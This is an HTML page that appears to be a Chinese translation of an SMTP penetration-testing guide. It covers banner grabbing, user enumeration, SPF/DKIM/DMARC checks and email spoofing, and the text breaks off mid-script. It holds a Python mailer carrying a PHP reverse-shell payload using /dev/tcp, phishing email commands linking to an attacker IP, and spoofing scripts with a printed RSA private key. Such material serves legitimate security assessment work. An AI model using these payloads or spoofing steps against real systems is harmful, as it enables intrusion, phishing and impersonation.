@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    <link rel="canonical" href="https://nosafe.wiki/Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>25,465,587 - SMTPs渗透测试 - No Safe - 明摆暗卷</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u57fa\u672c\u4fe1\u606f", url: "#_top", children: [
+              {title: "EMAIL Headers", url: "#email-headers" },
+          ]},
+          {title: "\u57fa\u672c\u52a8\u4f5c", url: "#_2", children: [
+              {title: "Banner \u6293\u53d6/\u57fa\u672c\u8fde\u63a5", url: "#banner" },
+              {title: "\u67e5\u627e\u7ec4\u7ec7\u7684 MX \u670d\u52a1\u5668", url: "#mx" },
+              {title: "\u679a\u4e3e", url: "#_3" },
+              {title: "NTLM Auth - \u4fe1\u606f\u6cc4\u9732", url: "#ntlm-auth-" },
+              {title: "\u5185\u90e8\u670d\u52a1\u5668\u540d\u79f0 - \u4fe1\u606f\u6cc4\u9732", url: "#-" },
+              {title: "\u55c5\u63a2", url: "#_4" },
+          ]},
+          {title: "\u7528\u6237\u540d\u66b4\u529b\u679a\u4e3e", url: "#_5", children: [
+              {title: "\u6536\u4ef6\u4eba", url: "#_6" },
+              {title: "VRFY", url: "#vrfy" },
+              {title: "EXPN", url: "#expn" },
+              {title: "\u81ea\u52a8\u5de5\u5177", url: "#_7" },
+          ]},
+          {title: "DSN \u8fd4\u56de", url: "#dsn", children: [
+          ]},
+          {title: "[\u547d\u4ee4]", url: "#_8", children: [
+              {title: "\u4ece linux \u63a7\u5236\u53f0\u53d1\u9001\u7535\u5b50\u90ae\u4ef6", url: "#linux" },
+              {title: "\u4f7f\u7528 Python \u53d1\u9001\u7535\u5b50\u90ae\u4ef6", url: "#python" },
+          ]},
+          {title: "\u90ae\u4ef6\u6b3a\u9a97", url: "#_9", children: [
+              {title: "SPF", url: "#spf" },
+              {title: "DKIM", url: "#dkim" },
+              {title: "DMARC", url: "#dmarc" },
+              {title: "\u5b50\u57df\u5462\uff1f", url: "#_12" },
+              {title: "\u6253\u5f00\u4e2d\u7ee7", url: "#_13" },
+              {title: "\u5de5\u5177", url: "#_14" },
+              {title: "\u53d1\u9001\u6076\u641e\u90ae\u4ef6", url: "#_15" },
+              {title: "\u66f4\u591a\u4fe1\u606f", url: "#_16" },
+          ]},
+          {title: "\u901a\u8fc7 SMTP \u6e17\u900f", url: "#smtp", children: [
+          ]},
+          {title: "\u914d\u7f6e\u6587\u4ef6", url: "#_17", children: [
+              {title: "\u540e\u7f00", url: "#_18" },
+          ]},
+          {title: "\u81ea\u52a8\u5316\u547d\u4ee4", url: "#_19", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../43%20-%20%20WHOIS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../43%20-%20%20WHOIS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-link">
+        43 - WHOIS渗透测试
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../23%20-%20Telnet%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../23%20-%20Telnet%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-link">
+        23 - Telnet 渗透测试
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="_1">基本信息</h2>
+<p><strong>SMTP（简单邮件传输协议）</strong>是一种用于<strong>发送</strong>和接收<strong>电子邮件的 TCP/IP 协议</strong>。但是，由于它在接收端对消息进行排队的能力有限，因此它通常与其他两种协议之一（POP3 或 IMAP）一起使用，使用户可以将消息保存在服务器邮箱中并定期从服务器下载它们。</p>
+<p>换句话说，<strong>用户通常使用</strong>使用<strong>SMTP 发送电子邮件</strong>并使用<strong>POP3 或 IMAP 接收</strong>电子邮件的程序。在基于 Unix 的系统上，<strong>sendmail</strong>是使用最广泛的电子邮件 SMTP 服务器。商业软件包 Sendmail 包括一个 POP3 服务器。<strong>Microsoft Exchange</strong>包括一个 SMTP 服务器，也可以设置为包括 POP3 支持。 从<a href="https://whatis.techtarget.com/definition/SMTP-Simple-Mail-Transfer-Protocol">这里开始</a>。</p>
+<p><strong>默认端口:</strong> 25,465(ssl),587(ssl)</p>
+<pre><code class="language-bash">PORT   STATE SERVICE REASON  VERSION
+25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
+</code></pre>
+<h3 id="email-headers">EMAIL Headers</h3>
+<p>如果你有机<strong>会让受害者给你发一封电子邮件</strong>（例如通过网页的联系方式），那么这样做是因为你可以通过查看邮件标题了解受害者<strong>的内部拓扑结构。</strong></p>
+<p>您还可以从 SMTP 服务器获取一封电子邮件，试图<strong>向该服务器发送一封电子邮件到一个不存在的地址</strong>（因为服务器将向攻击者发送一封 NDN 邮件）。但是，请确保您从允许的地址发送电子邮件（检查 SPF 策略）并且您可以接收 NDN 消息。</p>
+<p>您还应该尝试发送不同的内容，因为您可以在标题上<strong>找到更多有趣的信息，例如：</strong> 您应该发送 EICAR 测试文件。 检测<strong>AV</strong>可能允许您利用<strong>已知漏洞。</strong><code>X-Virus-Scanned: by av.domain.com</code></p>
+<h2 id="_2">基本动作</h2>
+<h3 id="banner"><strong>Banner 抓取/基本连接</strong></h3>
+<p><strong>SMTP:</strong></p>
+<pre><code class="language-bash">nc -vn &lt;IP&gt; 25
+</code></pre>
+<p><strong>SMTPS</strong>:</p>
+<pre><code class="language-bash">openssl s_client -crlf -connect smtp.mailgun.org:465 #没有starttls命令的SSL/TLS
+openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
+</code></pre>
+<h3 id="mx">查找组织的 MX 服务器</h3>
+<pre><code class="language-bash">dig +short mx google.com
+</code></pre>
+<h3 id="_3">枚举</h3>
+<pre><code class="language-bash">nmap -p25 --script smtp-commands 10.10.10.10
+nmap -p25 --script smtp-open-relay 10.10.10.10 -v
+</code></pre>
+<h3 id="ntlm-auth-">NTLM Auth - 信息泄露</h3>
+<p>如果服务器支持 NTLM 身份验证 (Windows)，您可以获得敏感信息（版本）。更多信息<a href="https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666"><strong>在这里</strong></a>。</p>
+<pre><code class="language-bash">root@kali: telnet example.com 587 
+220 example.com SMTP Server Banner 
+&gt;&gt; HELO 
+250 example.com Hello [x.x.x.x] 
+&gt;&gt; AUTH NTLM 334 
+NTLM supported 
+&gt;&gt; TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 
+334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
+</code></pre>
+<p>或者使用<strong>nmap</strong>插件<strong>自动执行</strong>此操作<code>smtp-ntlm-info.nse</code></p>
+<h3 id="-">内部服务器名称 - 信息泄露</h3>
+<p>当发出没有完整地址的命令“MAIL FROM”时，某些 SMTP 服务器会自动完成发件人的地址，从而泄露其内部名称：</p>
+<pre><code class="language-bash">220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200 
+EHLO all
+250-somedomain.com Hello [x.x.x.x]
+250-TURN
+250-SIZE 52428800
+250-ETRN
+250-PIPELINING
+250-DSN
+250-ENHANCEDSTATUSCODES
+250-8bitmime
+250-BINARYMIME
+250-CHUNKING
+250-VRFY
+250 OK
+MAIL FROM: me
+250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
+</code></pre>
+<h3 id="_4">嗅探</h3>
+<p>检查你是否从数据包中嗅探了一些密码到端口 25</p>
+<h2 id="_5">用户名暴力枚举</h2>
+<p><strong>并不总是需要身份验证</strong></p>
+<h3 id="_6">收件人</h3>
+<pre><code class="language-bash">$ telnet 10.0.10.1 25
+Trying 10.0.10.1...
+Connected to 10.0.10.1.
+Escape character is '^]'.
+220 myhost ESMTP Sendmail 8.9.3
+HELO x
+250 myhost Hello [10.0.0.99], pleased to meet you
+MAIL FROM:test@test.org
+250 2.1.0 test@test.org... Sender ok
+RCPT TO:test
+550 5.1.1 test... User unknown
+RCPT TO:admin
+550 5.1.1 admin... User unknown
+RCPT TO:ed
+250 2.1.5 ed... Recipient ok
+</code></pre>
+<h3 id="vrfy">VRFY</h3>
+<pre><code>$ telnet 10.0.0.1 25
+Trying 10.0.0.1...
+Connected to 10.0.0.1.
+Escape character is '^]'.
+220 myhost ESMTP Sendmail 8.9.3
+HELO
+501 HELO requires domain address
+HELO x
+250 myhost Hello [10.0.0.99], pleased to meet you
+VRFY root
+250 Super-User &lt;root@myhost&gt;
+VRFY blah
+550 blah... User unknown
+</code></pre>
+<h3 id="expn">EXPN</h3>
+<pre><code class="language-bash">$ telnet 10.0.10.1 25
+Trying 10.0.10.1...
+Connected to 10.0.10.1.
+Escape character is '^]'.
+220 myhost ESMTP Sendmail 8.9.3
+HELO
+501 HELO requires domain address
+HELO x
+EXPN test
+550 5.1.1 test... User unknown
+EXPN root
+250 2.1.5 &lt;ed.williams@myhost&gt;
+EXPN sshd
+250 2.1.5 sshd privsep &lt;sshd@mail2&gt;
+</code></pre>
+<p>摘自: https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/</p>
+<h3 id="_7">自动工具</h3>
+<pre><code class="language-bash">Metasploit: auxiliary/scanner/smtp/smtp_enum
+smtp-user-enum: smtp-user-enum -M &lt;MODE&gt; -u &lt;USER&gt; -t &lt;IP&gt;
+Nmap: nmap --script smtp-enum-users &lt;IP&gt;
+</code></pre>
+<h2 id="dsn">DSN 返回</h2>
+<p><strong>投递状态通知报告</strong>：如果您向某个组织发送<strong>电子邮件</strong>至<strong>无效地址</strong>，该组织将通知该地址无效<strong>并向您发回邮件</strong>。<strong>返回电子邮件的标题</strong>将<strong>包含</strong>可能的<strong>敏感信息</strong>（例如与报告交互的邮件服务的 IP 地址或防病毒软件信息）。</p>
+<h2 id="_8">[命令]</h2>
+<h3 id="linux">从 linux 控制台发送电子邮件</h3>
+<pre><code class="language-bash">root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
+Reading message body from STDIN because the '-m' option was not used.
+If you are manually typing in a message:
+  - First line must be received within 60 seconds.
+  - End manual input with a CTRL-D on its own line.
+
+IT Dept,
+
+We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.
+
+Sincerely,
+ swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header &quot;Subject: test&quot; --body &quot;please click here http://10.10.14.42/&quot; --server 10.10.10.197
+</code></pre>
+<h3 id="python">使用 Python 发送电子邮件</h3>
+<p>这是使用 python 脚本发送电子邮件的替代方法</p>
+<pre><code class="language-python">from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import smtplib
+import sys
+
+lhost = &quot;127.0.0.1&quot;
+lport = 443
+rhost = &quot;192.168.1.1&quot;
+rport = 25 # 489,587
+
+# create message object instance
+msg = MIMEMultipart()
+
+# setup the parameters of the message
+password = &quot;&quot; 
+msg['From'] = &quot;attacker@local&quot;
+msg['To'] = &quot;victim@local&quot;
+msg['Subject'] = &quot;This is not a drill!&quot;
+
+# payload 
+message = (&quot;&lt;?php system('bash -i &gt;&amp; /dev/tcp/%s/%d 0&gt;&amp;1'); ?&gt;&quot; % (lhost,lport))
+
+print(&quot;[*] Payload is generated : %s&quot; % message)
+
+msg.attach(MIMEText(message, 'plain'))
+server = smtplib.SMTP(host=rhost,port=rport)
+
+if server.noop()[0] != 250:
+    print(&quot;[-]Connection Error&quot;)
+    exit()
+
+server.starttls()
+
+# Uncomment if log-in with authencation
+# server.login(msg['From'], password)
+
+server.sendmail(msg['From'], msg['To'], msg.as_string())
+server.quit()
+
+print(&quot;[***]successfully sent email to %s:&quot; % (msg['To']))
+</code></pre>
+<h2 id="_9">邮件欺骗</h2>
+<p>本节的大部分内容摘自<strong>网络安全评估第 3 版一书</strong>。</p>
+<p>SMTP 消息很容易被欺骗，因此组织使用<strong>SPF</strong> 、<strong>DKIM</strong>和<strong>DMARC</strong>功能来防止各方发送未经授权的电子邮件。</p>
+<p><strong>有关这些对策</strong>的完整指南，请访问https://seanthegeek.net/459/demystifying-dmarc/</p>
+<h3 id="spf">SPF</h3>
+<p><strong>发件人策略框架</strong>(SPF) 提供了一种机制，允许 MTA 检查发送电子邮件的主机是否经过授权。 然后，组织可以定义授权邮件服务器列表，MTA 可以查询此列表以检查电子邮件是否被欺骗。 为了定义 IP 地址/范围、域和其他<strong>允许代表域名发送电子邮件的人，</strong> SPF 注册表中出现了不同的<strong>“机制”。</strong></p>
+<h4 id="_10">机制</h4>
+<table>
+<thead>
+<tr>
+<th>Mechanism</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ALL</td>
+<td>始终匹配；用于默认结果，例如<code>-all</code>所有与先前机制不匹配的 IP。</td>
+</tr>
+<tr>
+<td>A</td>
+<td>如果域名有可以解析到发件人地址的地址记录（A或AAAA），则匹配。</td>
+</tr>
+<tr>
+<td>IP4</td>
+<td>如果发件人在给定的 IPv4 地址范围内，则匹配。</td>
+</tr>
+<tr>
+<td>IP6</td>
+<td>如果发件人在给定的 IPv6 地址范围内，则匹配。</td>
+</tr>
+<tr>
+<td>MX</td>
+<td>如果域名有解析为发件人地址的 MX 记录，它将匹配（即邮件来自域的接收邮件服务器之一）。</td>
+</tr>
+<tr>
+<td>PTR</td>
+<td>如果客户端地址的域名（PTR 记录）在给定域中并且该域名解析为客户端地址（正向确认的反向 DNS），则匹配。这种机制是不鼓励的，应该尽可能避免。</td>
+</tr>
+<tr>
+<td>EXISTS</td>
+<td>如果给定的域名解析为任何地址，则匹配（无论它解析为哪个地址）。这很少使用。它与 SPF 宏语言一起提供更复杂的匹配，如 DNSBL 查询。</td>
+</tr>
+<tr>
+<td>INCLUDE</td>
+<td>引用另一个域的策略。如果该域的策略通过，则此机制通过。但是，如果包含的策略失败，处理将继续。要完全委托给另一个域的策略，必须使用重定向扩展。</td>
+</tr>
+<tr>
+<td>REDIRECT</td>
+<td>重定向是指向托管 SPF 策略的另一个域名的指针，它允许多个域共享相同的 SPF 策略。在处理共享相同电子邮件基础设施的大量域时，它很有用。</td>
+</tr>
+</tbody>
+</table>
+<p>还可以识别指示<strong>匹配机制时应执行的操作的限定符</strong>。默认情况下，使用<strong>限定符 “+”</strong> （因此，如果任何机制匹配，则意味着它是允许的）。 您通常会<strong>在每个 SPF 政策的末尾注明</strong>：<strong>~all</strong>或<strong>-all</strong> 。这用于指示<strong>如果发件人不符合任何 SPF 策略，您应该将电子邮件标记为不受信任 (~) 或拒绝 (-) 电子邮件。</strong></p>
+<h4 id="_11">限定条件</h4>
+<p>每个机制都可以与四个限定符之一组合：</p>
+<ul>
+<li><strong><code>+</code></strong>对于 PASS 结果。这个可以省略；例如，<code>+mx</code>与 相同<code>mx</code>。</li>
+<li><strong><code>?</code></strong>对于解释为 NONE（无政策）的 NEUTRAL 结果。</li>
+<li><strong><code>~</code></strong>（代字号）代表 SOFTFAIL，一种介于 NEUTRAL 和 FAIL 之间的调试辅助工具。通常，返回 SOFTFAIL 的消息会被接受但会被标记。</li>
+<li><strong><code>-</code></strong>（减号）对于失败，邮件应该被拒绝（见下文）。</li>
+</ul>
+<p>在下面的示例中，您可以阅读<strong>google.com 的 SPF 策略</strong>。请注意第<strong>一个 SPF 策略如何包含其他域的 SPF 策略：</strong></p>
+<pre><code class="language-bash">kali@kali:~$ dig txt google.com | grep spf
+google.com.             235     IN      TXT     &quot;v=spf1 include:_spf.google.com ~all&quot;
+
+kali@kali:~$ dig txt _spf.google.com | grep spf
+; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.7-Ubuntu &lt;&lt;&gt;&gt; txt _spf.google.com
+;_spf.google.com.               IN      TXT
+_spf.google.com.        235     IN      TXT     &quot;v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all&quot;
+
+kali@kali:~$ dig txt _netblocks.google.com | grep spf
+_netblocks.google.com.  1606    IN      TXT     &quot;v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all&quot;
+
+kali@kali:~$ dig txt _netblocks2.google.com | grep spf
+_netblocks2.google.com. 1908    IN      TXT     &quot;v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all&quot;
+
+kali@kali:~$ dig txt _netblocks3.google.com | grep spf
+_netblocks3.google.com. 1903    IN      TXT     &quot;v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all&quot;
+</code></pre>
+<p>传统上，可以欺骗任何没有正确/任何 SPF 记录的域名。<strong>如今</strong>，如果<strong>电子邮件</strong>来自<strong>没有有效 SPF 记录的域，</strong>可能会<strong>自动被拒绝/标记为不受信任</strong>。</p>
+<p>要检查域的 SPF，您可以使用在线工具，例如： https://www.kitterman.com/spf/validate.html</p>
+<h3 id="dkim">DKIM</h3>
+<p>DomainKeys Identified Mail (DKIM) 是一种机制，通过该机制，<strong>外国 MTA 在通过 DNS 检索域的公钥时对出站电子邮件进行签名和验证</strong>。DKIM 公钥保存在域的 TXT 记录中；但是，您必须知道选择器和域名才能检索它。</p>
+<p>然后，要请求密钥，您需要域名和邮件标题中的邮件选择器，<code>DKIM-Signature</code>例如：<code>d=gmail.com;s=20120113</code></p>
+<pre><code class="language-bash">dig 20120113._domainkey.gmail.com TXT | grep p=
+20120113._domainkey.gmail.com. 280 IN   TXT    &quot;k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg
+KCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
+</code></pre>
+<h3 id="dmarc">DMARC</h3>
+<p>基于域的消息身份验证、报告和一致性 (DMARC) 是一种在 SPF 和 DKIM 基础上扩展的邮件身份验证方法。策略指示邮件服务器如何处理给定域的电子邮件并报告执行的操作。</p>
+<p><a href="https://github.com/carlospolop/hacktricks/blob/master/.gitbook/assets/image (134).png"><img alt="img" src="../assets/image%20%28134%29.png" /></a></p>
+<p><strong>获取DMARC记录需要查询子域名_dmarc</strong></p>
+<pre><code class="language-bash">root@kali:~# dig _dmarc.yahoo.com txt | grep DMARC
+_dmarc.yahoo.com.  1785 IN TXT &quot;v=DMARC1\; p=reject\; sp=none\; pct=100\; 
+rua=mailto:dmarc-yahoo-rua@yahoo-inc.com, mailto:dmarc_y_rua@yahoo.com\;&quot;
+
+root@kali:~# dig _dmarc.google.com txt | grep DMARC
+_dmarc.google.com. 600 IN TXT &quot;v=DMARC1\; p=quarantine\; rua=mailto:mailauth-reports@google.com&quot;
+
+root@kali:~# dig _dmarc.paypal.com txt | grep DMARC
+_dmarc.paypal.com. 300 IN TXT &quot;v=DMARC1\; p=reject\; rua=mailto:d@rua.agari.com\; 
+ruf=mailto:dk@bounce.paypal.com,mailto:d@ruf.agari.com&quot;
+</code></pre>
+<p>PayPal 和 Yahoo 指示邮件服务器拒绝包含无效 DKIM 签名或并非来自其网络的邮件。然后将通知发送到每个组织内的相应电子邮件地址。谷歌以类似的方式配置，尽管它指示邮件服务器隔离邮件而不是完全拒绝它们。</p>
+<h4 id="dmarc_1">DMARC 标签</h4>
+<table>
+<thead>
+<tr>
+<th>Tag Name</th>
+<th>Purpose</th>
+<th>Sample</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>v</td>
+<td>协议版本</td>
+<td>v=DMARC1</td>
+</tr>
+<tr>
+<td>pct</td>
+<td>受到过滤的消息的百分比</td>
+<td>pct=20</td>
+</tr>
+<tr>
+<td>ruf</td>
+<td>取证报告的报告 URI</td>
+<td>ruf=mailto:authfail@example.com</td>
+</tr>
+<tr>
+<td>rua</td>
+<td>汇总报告的报告 URI</td>
+<td>rua=mailto:aggrep@example.com</td>
+</tr>
+<tr>
+<td>p</td>
+<td>组织域策略</td>
+<td>p=quarantine</td>
+</tr>
+<tr>
+<td>sp</td>
+<td>OD 子域的策略</td>
+<td>sp=reject</td>
+</tr>
+<tr>
+<td>adkim</td>
+<td>DKIM 的对齐模式</td>
+<td>adkim=s</td>
+</tr>
+<tr>
+<td>aspf</td>
+<td>SPF 对齐模式</td>
+<td>aspf=r</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_12"><strong>子域呢？</strong></h3>
+<p><strong>从这里</strong> <a href="https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains"><strong>开始</strong></a><strong>.</strong>
+您需要为您希望从中发送邮件的每个子域拥有单独的 SPF 记录。 以下内容最初发布在 openspf.org 上，该网站曾经是此类内容的重要资源。</p>
+<blockquote>
+<p>难搞的问题: 子域呢？</p>
+<p>如果我收到来自 pielovers.demon.co.uk 的邮件，并且没有 pielovers 的 SPF 数据，我是否应该返回一级并测试 demon.co.uk 的 SPF？不。Demon 的每个子域都是不同的客户，每个客户可能有自己的政策。默认情况下 Demon 的政策适用于所有客户是没有意义的；如果 Demon 想要这样做，它可以为每个子域设置 SPF 记录。</p>
+<p>因此，对 SPF 发布者的建议是：您应该为每个具有 A 或 MX 记录的子域或主机名添加 SPF 记录。</p>
+<p>具有通配符 A 或 MX 记录的站点还应具有通配符 SPF 记录，格式为：* IN TXT "v=spf1 -all"</p>
+</blockquote>
+<p>这是有道理的——一个子域很可能位于不同的地理位置并且具有非常不同的 SPF 定义。</p>
+<h3 id="_13"><strong>打开中继</strong></h3>
+<p>为防止发送的邮件被垃圾邮件过滤器过滤而无法到达收件人，发件人可以使用<strong>收件人信任的中继服务器</strong>。通常，管理员<strong>没有概述</strong>他们必须<strong>允许</strong>哪些<strong>IP范围</strong>。这会导致我们在外部和内部渗透测试中仍然经常发现的 SMTP 服务器配置错误。因此，它们<strong>允许所有 IP 地址</strong>不会在电子邮件流量中造成错误，从而不会干扰或无意中中断与潜在和当前客户的通信：</p>
+<pre><code class="language-bash">mynetworks = 0.0.0.0/0
+nmap -p25 --script smtp-open-relay 10.10.10.10 -v
+</code></pre>
+<h3 id="_14"><strong>工具</strong></h3>
+<ul>
+<li><a href="https://github.com/serain/mailspoof"><strong>https://github.com/serain/mailspoof</strong></a> <strong>检查 SPF 和 DMARC 配置错误</strong></li>
+<li><a href="https://pypi.org/project/checkdmarc/"><strong>https://pypi.org/project/checkdmarc/</strong></a> <strong>自动获取 SPF 和 DMARC 配置</strong> </li>
+</ul>
+<h3 id="_15">发送恶搞邮件</h3>
+<ul>
+<li><a href="https://www.mailsploit.com/index"><strong>https://www.mailsploit.com/index</strong></a></li>
+<li><strong><a href="http://www.anonymailer.net/">http://www.anonymailer.net/</a></strong></li>
+<li><a href="https://emkei.cz/"><strong>https://emkei.cz/</strong></a></li>
+</ul>
+<p><strong>或者你可以使用这个工具：</strong></p>
+<ul>
+<li><a href="https://github.com/magichk/magicspoofing"><strong>https://github.com/magichk/magicspoofing</strong></a></li>
+</ul>
+<pre><code class="language-bash"># 这将从test@victim.com发送测试电子邮件到destination@gmail.com
+python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
+# 但你也可以修改邮件的更多选项
+python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
+</code></pre>
+<p>如果您<strong>在 dkim python 库</strong>中使用解析密钥时遇到任何错误，请随意使用以下一个。
+<strong>注意</strong>：这只是一个肮脏的修复，用于在由于某种原因 openssl 私钥<strong>无法被 dkim 解析的</strong>情况下进行快速检查。</p>
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
+spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
+pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
+AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
+koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
+fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
+1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
+ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
+GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
+422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
+Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
+zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
+K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p><strong>或者你可以手动完成：</strong></p>
+<p>php</p>
+<pre><code class="language-php"># 这将发送未签名的消息
+mail(&quot;your_email@gmail.com&quot;, &quot;Test Subject!&quot;, &quot;hey! This is a test&quot;, &quot;From: administrator@victim.com&quot;);
+</code></pre>
+<p>Python</p>
+<pre><code class="language-python"># 来自 https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py
+
+import os
+import dkim #pip3 install dkimpy
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+
+# Set 
+destination=&quot;destination@gmail.com&quot;
+sender=&quot;administrator@victim.com&quot;
+subject=&quot;Test&quot;
+message_html=&quot;&quot;&quot;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;h3&gt;This is a test, not a scam&lt;/h3&gt;
+        &lt;br /&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+&quot;&quot;&quot;
+sender_domain=sender.split(&quot;@&quot;)[1]
+
+# Prep
+os.system(&quot;sudo sed -ri 's/(myhostname) = (.*)/\\1 = &quot;+sender_domain+&quot;/g' /etc/postfix/main.cf&quot;)
+os.system(&quot;systemctl restart postfix&quot;)
+
+# 生成 DKIM keys
+dkim_private_key_path=&quot;dkimprivatekey.pem&quot;
+os.system(f&quot;openssl genrsa -out {dkim_private_key_path} 1024 2&gt; /dev/null&quot;)
+with open(dkim_private_key_path) as fh:
+    dkim_private_key = fh.read()
+
+# 生成电子邮件
+msg = MIMEMultipart(&quot;alternative&quot;)
+msg.attach(MIMEText(message_html, &quot;html&quot;))
+msg[&quot;To&quot;] = destination
+msg[&quot;From&quot;] = sender
+msg[&quot;Subject&quot;] = subject
